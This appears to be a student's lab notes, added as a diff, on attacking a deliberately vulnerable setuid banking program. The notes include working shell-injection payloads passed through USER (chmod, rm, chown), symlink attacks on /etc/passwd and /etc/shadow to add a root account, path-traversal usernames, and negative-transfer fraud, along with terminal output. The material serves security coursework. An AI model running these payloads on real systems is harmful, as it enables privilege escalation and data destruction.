@@ -1,0 +1,354 @@
+--------------------------------------------------------------------
+                              ISSUE 0
+Vulnerability: Describe where the code is vulnerable,
+and what the issue is.
+
+Exploit a: Outline a specific exploit for the above vulnerability. 
+The exploit should be found in exploits/e1a
+
+Impact a: Outline the impact of the exploit, including why it is C/I or A.
+
+Exploit b: Found in e1b
+Impact b:
+
+Exploit c: 
+Impact c
+
+Exploit d: 
+Impact d:
+
+...
+
+--------------------------------------------------------------------
+                              ISSUE 1
+Vulnerability: Usernames are identified through the USER environment variable. The hacker can set USER to run malicious code as root when the program reports on the account using setuid(0) and system(). 
+
+This is easy to impersonate since it can be changed from the shell
+If the password is compromised, it is trivial for a hacker to impersonate the user to gain control of the account.
+
+
+$USER="; chmod -R 7777 ."
+$./account ''
+
+$USER="; mv passwords passwords.BAK"
+$./account ''
+
+$ln -s /etc/passwd passwords
+$USER="; chown root:root passwords"
+$./account ''
+
+$USER="froot:x:0:0:/root:/bin/bash"
+$./account ''
+
+$USER="; rm -f passwords"
+$./account ''
+
+$ln -s /etc/shadow passwords
+$USER="; chown root:root passwords"
+$./account ''
+
+$USER="froot::::::::"
+$./account ''
+
+$USER="; mv passwords.BAK passwords"
+$./account ''
+restart the VM
+
+SYSTEM
+
+Exploit a: 
+Impact a: Allows the hacker perform priviledge escalation. 
+
+Exploit c: 
+Impact c: Allows the hacker to add a root user to /etc/passwd
+
+Exploit d: 
+Impact d: Allows the hacker to add a root user to /etc/shadow
+
+Exploit e: 
+Impact e: Allows the user to delete files needed for the progam
+
+Exploit b:
+Impact b: Allows the hacker to own the symbolic link  
+
+...
+
+--------------------------------------------------------------------
+                              ISSUE 2
+Vulnerability: By using negative number (using the minus "-" sign) but not by using integer overflow.
+
+$USER=num1
+$./account pw1
+$USER=num2
+$./account pw2
+$./account pw2 num1 -100
+
+Exploit a: 
+Impact a:
+
+There are also no lower limits on accounts, people can take far more money than is in the account.
+
+$USER=num1
+$./account pw1
+$./account pw1 99 num1
+$./account pw1 198 num1
+$./account pw1 396 num1
+
+
+Exploit b: 
+Impact b:
+
+Exploit c: 
+Impact c
+
+Exploit d: 
+Impact d:
+
+...
+
+--------------------------------------------------------------------
+                              ISSUE 3
+Vulnerability: If /vulnerable/passwords is a symbolic link, then the username and password can be written to the linked file. The hacker could even create a password backup beforehand then add the user/pw to the backup file. This way the hacker gains the info but the user thinks that everything is running as usual since their account is setup and usable. 
+
+
+
+$touch ps
+
+$ln -s ps passwords
+$USER="; chown root:root passwords"
+$./account ''
+
+$cat ps
+
+Exploit a: 
+Impact a:
+
+Exploit b: 
+Impact b:
+
+Exploit c: 
+Impact c
+
+Exploit d: 
+Impact d:
+
+...
+
+--------------------------------------------------------------------
+                              ISSUE 4
+Vulnerability: The accounts directory, and all the contents, are able to read by any other user.
+
+Exploit a: 
+Impact a:
+
+Exploit b: 
+Impact b:
+
+Exploit c: 
+Impact c
+
+Exploit d: 
+Impact d:
+
+...
+
+--------------------------------------------------------------------
+                              ISSUE 5
+Vulnerability: The accounts directory, and all the contents, are able to read by any other user.
+
+Exploit a: 
+Impact a:
+
+Exploit b: 
+Impact b:
+
+Exploit c: 
+Impact c
+
+Exploit d: 
+Impact d:
+
+...
+
+--------------------------------------------------------------------
+
+				.
+				.
+				.
+
+
+Transfers can go to yourself for infinite money
+
+Undefined behaviour when atio is given bad input
+
+Race conditions when writing to file. Multiple users could access log or passwords concurrently
+
+
+
+
+
+if (stat(“/some_dir/some_file”, &statbuf) == -1) {
+err(1, "stat");
+}
+if (statbuf.st_size >= MAX_FILE_SIZE) {
+err(2, "file size");
+}
+if ((fd=open(“/some_dir/some_file”, O_RDONLY)) == -1) {
+err(3, "open - %s",argv[1]);
+}
+
+
+
+Overlapping names
+
+[hacker@rh72 vulnerable]$ USER=u1
+[hacker@rh72 vulnerable]$ ./account p1
+Your account has:
+100
+[hacker@rh72 vulnerable]$ USER=./u1
+[hacker@rh72 vulnerable]$ ./account p2
+Your account has:
+100
+
+
+Names with spaces
+
+[hacker@rh72 vulnerable]$ USER="u1 u2"
+[hacker@rh72 vulnerable]$ ./account p2
+Your account has:
+100cat: u2: No such file or directory
+
+
+Everyone can read accounts
+
+[hacker@rh72 vulnerable]$ USER=u1
+[hacker@rh72 vulnerable]$ ./account p1
+Your account has:
+100
+[hacker@rh72 vulnerable]$ cd accounts
+[hacker@rh72 vulnerable]$ USER=u2
+[hacker@rh72 accounts]$ cat u1    
+
+
+
+
+
+Bad password
+
+[hacker@rh72 vulnerable]$ USER=u1
+[hacker@rh72 vulnerable]$ ./account ''
+Your account has:
+100
+[hacker@rh72 vulnerable]$ ./account ''
+You have not been authenticated
+
+Bad username
+
+[hacker@rh72 vulnerable]$ USER=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[hacker@rh72 vulnerable]$ ./account p1 
+Your account has:
+sh: -c: line 1: syntax error near unexpected token `/vulnerable/accounts/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����X���q���(�'
+sh: -c: line 1: `cat /vulnerable/accounts/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����X���q���(�����5@'
+
+
+
+
+[hacker@rh72 vulnerable]$ USER=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
+[hacker@rh72 vulnerable]$ ./account p1
+Your account has:
+sh: -c: line 1: syntax error near unexpected token `/vulnerable/accounts/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC����X���q���(�'
+sh: -c: line 1: `cat /vulnerable/accounts/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC����X���q���(�����5@'
+
+[hacker@rh72 vulnerable]$ USER=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
+[hacker@rh72 vulnerable]$ ./account p2
+Segmentation fault
+
+
+
+
+
+[hacker@rh72 vulnerable]$ USER=u1
+[hacker@rh72 vulnerable]$ ./account ' p1 p2 '
+Your account has:
+100
+[hacker@rh72 vulnerable]$ ./account ' p1 p2 '
+You have not been authenticated
+
+
+
+If the permissions for accounts is set using 755 then all users can directly view everyones account history by using cat. No authentication is used. 
+
+If the permissions are set using 700 then users cannot directly view each others accounts. They can only view accounts whose credentials then know.
+
+
+[hacker@rh72 vulnerable]$ USER=
+[hacker@rh72 vulnerable]$ ./account p1
+Segmentation fault
+
+
+
+[hacker@rh72 vulnerable]$ USER='\n'
+[hacker@rh72 vulnerable]$ ./account p1
+Your account has:
+cat: /vulnerable/accounts/n: No such file or directory
+
+
+
+
+
+[hacker@rh72 vulnerable]$ ls accounts 
+u1 
+[hacker@rh72 vulnerable]$ USER="; echo 'u1 p2'>passwords"
+[hacker@rh72 vulnerable]$ ./account ''
+Your account has:
+cat: /vulnerable/accounts/: Is a directory
+[hacker@rh72 vulnerable]$ USER="u1"
+[hacker@rh72 vulnerable]$ ./account p2
+Your account has:
+100
+
+
+
+[hacker@rh72 vulnerable]$ USER=../log
+[hacker@rh72 vulnerable]$ ./account p1
+Your account has:
+100
+[root@rh72 vulnerable]# cat log 
+100../log: p1 
+[root@rh72 vulnerable]# ls accounts/
+
+
+[hacker@rh72 vulnerable]$ USER=../passwords
+[hacker@rh72 vulnerable]$ ./account p1
+Your account has:
+100
+[root@rh72 vulnerable]# cat passwords 
+100
+[hacker@rh72 vulnerable]# ls accounts/
+
+
+[hacker@rh72 vulnerable]$ USER=../new
+[hacker@rh72 vulnerable]$ ./account p
+Your account has:
+100
+[hacker@rh72 vulnerable]# ls -la new 
+-rw-rw-r--    1 root     root            3 Oct 11 10:30 new
+[hacker@rh72 vulnerable]# ls -la accounts
+total 8
+drwxr-xr-x    2 root     root         4096 Oct 11 10:29 .
+drwxr-xr-x    4 748      705          4096 Oct 11 10:30 ..
+
+
+
+[hacker@rh72 vulnerable]$ USER=../account
+[hacker@rh72 vulnerable]$ ./account p1
+Segmentation fault
+
+
+
+[hacker@rh72 vulnerable]$ USER=../account.c
+[hacker@rh72 vulnerable]$ ./account p1
+Your account has:
+100
+
+
